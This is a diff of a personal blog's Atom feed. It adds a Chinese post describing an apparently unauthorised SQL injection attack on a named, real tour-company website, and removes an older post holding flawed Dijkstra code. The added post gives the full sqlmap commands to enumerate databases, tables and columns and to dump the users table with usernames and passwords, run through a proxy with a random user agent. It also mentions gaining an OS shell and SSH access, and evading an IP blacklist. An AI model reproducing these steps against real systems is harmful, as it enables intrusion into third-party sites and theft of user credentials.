@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-07-14T11:35:24.725Z</updated>
+  <updated>2019-07-16T07:28:14.411Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,34 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>sqlmap注入拿后台</title>
+    <link href="http://yoursite.com/2019/07/15/2019-07-15-sqlmap-1/"/>
+    <id>http://yoursite.com/2019/07/15/2019-07-15-sqlmap-1/</id>
+    <published>2019-07-14T16:00:00.000Z</published>
+    <updated>2019-07-16T07:28:14.411Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>本文总过程中无破坏性操作</strong><br>对于这种php的无防站，直接用sqlmap+msf就可以拿。<br>对于那些暴露参数的php站的可以直接拿库，刚刚随便找了个。<br>2019-07-16:被发现了。。ip被黑名单，于是换了个节点。。。还可以登录</p><a id="more"></a><h2 id="先找后台（这位老哥直接在右上角放了链接）"><a href="#先找后台（这位老哥直接在右上角放了链接）" class="headerlink" title="先找后台（这位老哥直接在右上角放了链接）"></a>先找后台（这位老哥直接在右上角放了链接）</h2><p><a href="http://hesselgravetours.com/event.php?tourID=1721" target="_blank" rel="noopener">http://hesselgravetours.com/event.php?tourID=1721</a></p><ul><li>check databases<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://****tours.com/event.php?tourID=1721 --dbs --proxy socks5://127.0.0.1:1080 --random-agent</span><br></pre></td></tr></table></figure></li></ul><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/hessel-1.png" alt title>                </div>                <div class="image-caption"></div>            </figure><ul><li>check tables<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://****tours.com/event.php?tourID=1721 -D hesselgrave --tables --proxy socks5://127.0.0.1:1080 --random-agent</span><br></pre></td></tr></table></figure></li></ul><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/hessel-2.png" alt title>                </div>                <div class="image-caption"></div>            </figure><ul><li>check columns<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://****tours.com/event.php?tourID=1721 -D hesselgrave -T users --columns --proxy socks5://127.0.0.1:1080 --random-agent</span><br></pre></td></tr></table></figure></li></ul><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/hessel-3.png" alt title>                </div>                <div class="image-caption"></div>            </figure><ul><li>dump <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://****tours.com/event.php?tourID=1721 -D hesselgrave -T users -C username,userID,password,accesslevel --dump --proxy socks5://127.0.0.1:1080 --random-agent</span><br></pre></td></tr></table></figure></li></ul><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/hessel-4.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>可见没经过加密。。<br>如果经过了简单加密的话（如mysql的md5(passwd)），就可以找个在线网站撞（比如<a href="https://www.cmd5.com/）" target="_blank" rel="noopener">https://www.cmd5.com/）</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/hessel-5.JPG" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="后续不贴了。"><a href="#后续不贴了。" class="headerlink" title="后续不贴了。"></a>后续不贴了。</h2><p><strong>防御太低有好几种方法找到路进行提权</strong></p><ul><li>因为在前面已经得到系统是FreeBSD或者是其他linux，并且得到网站运行在的用户名是content，懂我意思吧</li><li>继续用sqlmap –os-shell提权，第一次没有找到上传点</li><li>后台找到这个admin/documents/clients_recordview.php</li></ul><h2 id="插-入-服-务-器"><a href="#插-入-服-务-器" class="headerlink" title="插 入 服 务 器"></a>插 入 服 务 器</h2><p>提示是：<br>ssh -o HostKeyAlgorithms=+ssh-dss <a href="mailto:content@hesselgravetours.com" target="_blank" rel="noopener">content@hesselgravetours.com</a></p><p>密码是<del><strong><strong>***</strong></strong></del><br>图片不贴了</p><h4 id="明天读一下"><a href="#明天读一下" class="headerlink" title="明天读一下"></a>明天读一下</h4><p><a href="https://arxiv.org/pdf/1502.01852.pdf" target="_blank" rel="noopener">https://arxiv.org/pdf/1502.01852.pdf</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;strong&gt;本文总过程中无破坏性操作&lt;/strong&gt;&lt;br&gt;对于这种php的无防站，直接用sqlmap+msf就可以拿。&lt;br&gt;对于那些暴露参数的php站的可以直接拿库，刚刚随便找了个。&lt;br&gt;2019-07-16:被发现了。。ip被黑名单，于是换了个节点。。。还可以登录&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
+    
+    
+      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
+    
+      <category term="web" scheme="http://yoursite.com/tags/web/"/>
+    
+      <category term="sqlmap" scheme="http://yoursite.com/tags/sqlmap/"/>
+    
+      <category term="msf" scheme="http://yoursite.com/tags/msf/"/>
+    
+  </entry>
   
   <entry>
     <title>部分MACOS风格的ubuntu</title>
@@ -451,28 +479,6 @@
     
     
       <category term="url" scheme="http://yoursite.com/tags/url/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Dijstra</title>
-    <link href="http://yoursite.com/2018/12/11/2018-12-11-dijstra/"/>
-    <id>http://yoursite.com/2018/12/11/2018-12-11-dijstra/</id>
-    <published>2018-12-10T16:00:00.000Z</published>
-    <updated>2019-07-14T10:10:41.295Z</updated>
-    
-    <content type="html"><![CDATA[<p>求最短路的算法只记得Floyd，单源最短路Dijstra差点忘了<del>已经忘了</del></p><a id="more"></a><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Link</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> from,to,dist;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> d,u;</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> &lt;(<span class="keyword">const</span> HeapNode &amp; a) <span class="keyword">const</span>&#123;</span><br><span class="line"><span class="keyword">return</span> d &gt; a.d;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">SubstrateNetwork</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> nodes;</span><br><span class="line"><span class="keyword">int</span> links</span><br><span class="line"><span class="built_in">vector</span>&lt;Link&gt; maplinks;</span><br><span class="line"><span class="keyword">bool</span> isvisited[nodes+<span class="number">1</span>];</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; G[nodes+<span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> distance[nodes+<span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> p[nodes+<span class="number">1</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;n = n;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt;= n;i++)G[i].clear();</span><br><span class="line"><span class="built_in">memset</span>(vis,<span class="literal">false</span>,<span class="keyword">sizeof</span> vis);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt;= n;i++)p[i] = i;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt;= n;i++)d[i] = INF;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijstra</span><span class="params">(<span class="keyword">int</span> s)</span></span>&#123;</span><br><span class="line">priority_queue&lt;Node&gt; q;</span><br><span class="line">q.push(Node&#123;<span class="number">0</span>,s&#125;);</span><br><span class="line">distance[s] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(!q.empty())&#123;</span><br><span class="line">Node temp = q.top();</span><br><span class="line">q.pop();</span><br><span class="line"><span class="keyword">int</span> u = temp.u;</span><br><span class="line"><span class="keyword">if</span>(isvisited[u])</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">isvisited[u]=<span class="literal">true</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;G[u].size();i++)&#123;</span><br><span class="line">Link e = maplinks[G[u][i]];</span><br><span class="line"><span class="keyword">if</span>(distance[e.to] &gt; distance[u] + e.dist)&#123;</span><br><span class="line">distance[e.to] = distance[u] + e.dist;</span><br><span class="line">p[e.to] = u;</span><br><span class="line">q.push(HeapNode&#123;distance[e.to],e.to&#125;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;求最短路的算法只记得Floyd，单源最短路Dijstra差点忘了&lt;del&gt;已经忘了&lt;/del&gt;&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="算法" scheme="http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"/>
-    
-    
-      <category term="algorithm" scheme="http://yoursite.com/tags/algorithm/"/>
     
   </entry>
   
